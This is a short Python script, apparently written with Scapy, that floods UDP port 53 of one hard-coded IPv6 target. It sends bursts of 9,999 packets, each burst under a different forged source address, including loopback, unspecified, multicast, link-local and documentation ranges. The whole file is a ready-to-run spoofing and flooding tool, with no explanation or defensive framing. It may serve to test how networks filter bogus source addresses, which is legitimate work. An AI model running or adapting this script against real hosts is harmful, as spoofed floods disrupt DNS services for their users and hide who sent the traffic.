#!/usr/bin/python
#Author : Antonio Taboada
#Date: 10/10/2017
#Filename: ipv6spoofudp.py
#Purpose : Simple IPv6 UDP spoof origen IP ;
import sys
from scapy.all import *
destino ="2a02:9140:3c00:7b00:6f99:c2bf:7d3d:dc22"
send((IPv6(dst=destino)/UDP(sport=0,dport=53)),iface="wlo1", count=9999)
iporigen ="2a02:9140:3c00:7b00:6f99:c2bf:7d3d:dc22"
send((IPv6(src=iporigen, dst=destino)/UDP(sport=0,dport=53)),iface="wlo1", count=9999)
iporigen = "2a02:9140:3c01:1100:20b:dbff:fe53:37a1"
send((IPv6(src=iporigen, dst=destino)/UDP(sport=0,dport=53)),iface="wlo1", count=9999)
iporigen = "2001::1"
send((IPv6(src=iporigen, dst=destino)/UDP(sport=0,dport=53)),iface="wlo1", count=9999)
iporigen = "::224.0.0.1"
send((IPv6(src=iporigen, dst=destino)/UDP(sport=0,dport=53)),iface="wlo1", count=9999)
iporigen = "::192.168.1.1"
send((IPv6(src=iporigen, dst=destino)/UDP(sport=5353,dport=53)),iface="wlo1", count=9999)
iporigen = "2a02:9140:3c00:7b00:6f99:c2bf:7d3d:dc21"
send((IPv6(src=iporigen, dst=destino)/UDP(sport=5353,dport=53)),iface="wlo1", count=9999)
iporigen = "0200::1"
send((IPv6(src=iporigen, dst=destino)/UDP(sport=5353,dport=53)),iface="wlo1", count=9999)
iporigen = "::"
send((IPv6(src=iporigen, dst=destino)/UDP(sport=5353,dport=53)),iface="wlo1", count=9999)
iporigen = "::1"
send((IPv6(src=iporigen, dst=destino)/UDP(sport=5353,dport=53)),iface="wlo1", count=9999)
iporigen = "::1.1.1.1"
send((IPv6(src=iporigen, dst=destino)/UDP(sport=5353,dport=53)),iface="wlo1", count=9999)
iporigen = "0100::"
send((IPv6(src=iporigen, dst=destino)/UDP(sport=5353,dport=53)),iface="wlo1", count=9999)
iporigen = "0200::"
send((IPv6(src=iporigen, dst=destino)/UDP(sport=5353,dport=53)),iface="wlo1", count=9999)
iporigen = "2001:db8::"
send((IPv6(src=iporigen, dst=destino)/UDP(sport=5353,dport=53)),iface="wlo1", count=9999)
iporigen = "2002::"
send((IPv6(src=iporigen, dst=destino)/UDP(sport=5353,dport=53)),iface="wlo1", count=9999)
iporigen = "2002:0a00::"
send((IPv6(src=iporigen, dst=destino)/UDP(sport=5353,dport=53)),iface="wlo1", count=9999)
iporigen = "fe80::"
send((IPv6(src=iporigen, dst=destino)/UDP(sport=5353,dport=53)),iface="wlo1", count=9999)
iporigen = "fec0::"
send((IPv6(src=iporigen, dst=destino)/UDP(sport=5353,dport=53)),iface="wlo1", count=9999)
iporigen = "ff00::"
send((IPv6(src=iporigen, dst=destino)/UDP(sport=5353,dport=53)),iface="wlo1", count=9999)
